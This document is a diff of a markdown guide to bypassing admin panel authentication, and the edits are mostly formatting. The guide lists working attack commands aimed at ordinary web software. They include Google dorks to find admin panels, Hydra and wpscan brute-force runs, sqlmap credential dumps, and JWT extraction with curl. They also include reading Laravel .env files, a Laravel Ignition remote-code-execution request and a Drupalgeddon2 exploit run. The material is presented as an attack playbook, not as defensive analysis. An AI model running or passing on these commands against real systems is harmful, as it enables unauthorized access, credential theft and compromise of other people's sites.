@@ -95,10 +95,6 @@ Bypassing an admin panel depends on the security flaws present in the target app
 
 ---
 
-Here are **additional** methods to bypass admin panel authentication:
-
----
-
 ### **11. Hidden Parameters & Debug Mode Exploitation**
 - Some applications have hidden parameters like:
   ```
@@ -252,20 +248,15 @@ Here are **additional** methods to bypass admin panel authentication:
   ```
 
 ---
-### **Automating Admin Panel Bypass & CMS-Specific Attacks** 🚀  
 
-Here’s how you can automate the attack process and target **specific CMS frameworks** like WordPress, Joomla, Laravel, etc.
-
----
-
-## **🔥 Automating Admin Panel Bypass**
-### **1️⃣ Google Dorking (Finding Admin Panels)**
+## ** Automating Admin Panel Bypass**
+### **1️) Google Dorking (Finding Admin Panels)**
 Use Google Dorks to find exposed admin panels:
 ```bash
 site:example.com inurl:admin
 site:example.com intitle:"admin login"
 ```
-👉 Automate it using **GoogDork**:  
+  Automate it using **GoogDork**:  
 ```bash
 git clone https://github.com/ZephrFish/GoogD0rker.git
 cd GoogD0rker
@@ -274,7 +265,7 @@ python3 GoogD0rker.py -q "inurl:admin" -o results.txt
 
 ---
 
-### **2️⃣ Bruteforce & Credential Stuffing**
+### **2️) Bruteforce & Credential Stuffing**
 #### **Tools:**
 - **Hydra**:  
   ```bash
@@ -287,19 +278,19 @@ python3 GoogD0rker.py -q "inurl:admin" -o results.txt
 
 ---
 
-### **3️⃣ SQL Injection Automation**
+### **3️) SQL Injection Automation**
 Automate SQLi to bypass login pages:
 ```bash
 sqlmap -u "http://example.com/admin/login" --data="username=admin&password=pass" --dbs --batch
 ```
-👉 **Get Admin Credentials:**
+- **Get Admin Credentials:**
 ```bash
 sqlmap -u "http://example.com/admin/login" --data="username=admin&password=pass" --dump
 ```
 
 ---
 
-### **4️⃣ Cookie / JWT Exploitation**
+### **4️) Cookie / JWT Exploitation**
 - Extract **JWT Token**:
   ```bash
   curl -X POST "https://target.com/api/login" -d "user=admin&pass=admin" -v
@@ -311,7 +302,7 @@ sqlmap -u "http://example.com/admin/login" --data="username=admin&password=pass"
 
 ---
 
-### **5️⃣ API Misconfiguration Exploitation**
+### **5️) API Misconfiguration Exploitation**
 Use **Arjun** to find hidden API parameters:
 ```bash
 python3 arjun.py -u "https://example.com/admin" -m GET
@@ -319,58 +310,58 @@ python3 arjun.py -u "https://example.com/admin" -m GET
 
 ---
 
-## **🔥 CMS-Specific Exploits**
-### **1️⃣ WordPress (wp-admin Bypass)**
-👉 **Find Admin Panel:**
+## **  CMS-Specific Exploits**
+### **1️) WordPress (wp-admin Bypass)**
+- **Find Admin Panel:**
 ```bash
 wpscan --url https://example.com --enumerate vp
 ```
-👉 **Bruteforce Attack:**
+- **Bruteforce Attack:**
 ```bash
 wpscan --url https://example.com -U admin -P rockyou.txt
 ```
-👉 **Exploit Vulnerable Plugins:**  
+- **Exploit Vulnerable Plugins:**  
 Use **exploit-db** to find vulnerable WordPress plugins.
 
 ---
 
-### **2️⃣ Joomla (Administrator Panel Exploit)**
-👉 **Find Joomla Admin Panel:**
+### **2️) Joomla (Administrator Panel Exploit)**
+- **Find Joomla Admin Panel:**
 ```bash
 joomscan -u https://example.com
 ```
-👉 **Exploit Vulnerabilities:**
+- **Exploit Vulnerabilities:**
 ```bash
 searchsploit Joomla
 ```
 
 ---
 
-### **3️⃣ Laravel (Debug Mode / RCE)**
-👉 **Find Laravel Debug Mode Enabled:**
+### **3️) Laravel (Debug Mode / RCE)**
+- **Find Laravel Debug Mode Enabled:**
 ```bash
 curl -X GET "https://example.com/.env"
 ```
-👉 **Exploit RCE via Debug Mode:**
+- **Exploit RCE via Debug Mode:**
 ```bash
 curl -X POST "https://example.com/_ignition/execute-solution" -d '{"solution": "phpinfo()"}'
 ```
 
 ---
 
-### **4️⃣ Drupal (Admin Exploit)**
-👉 **Check Drupal Version:**
+### **4️) Drupal (Admin Exploit)**
+- **Check Drupal Version:**
 ```bash
 droopescan scan drupal -u https://example.com
 ```
-👉 **Drupal RCE (Drupalgeddon2 Exploit):**
+- **Drupal RCE (Drupalgeddon2 Exploit):**
 ```bash
 python3 drupalgeddon2.py -u https://example.com
 ```
 
 ---
 
-### **5️⃣ OpenCart / Magento**
+### **5️) OpenCart / Magento**
 - Use **Magento Scan**:  
   ```bash
   python3 magento_scan.py -u https://example.com
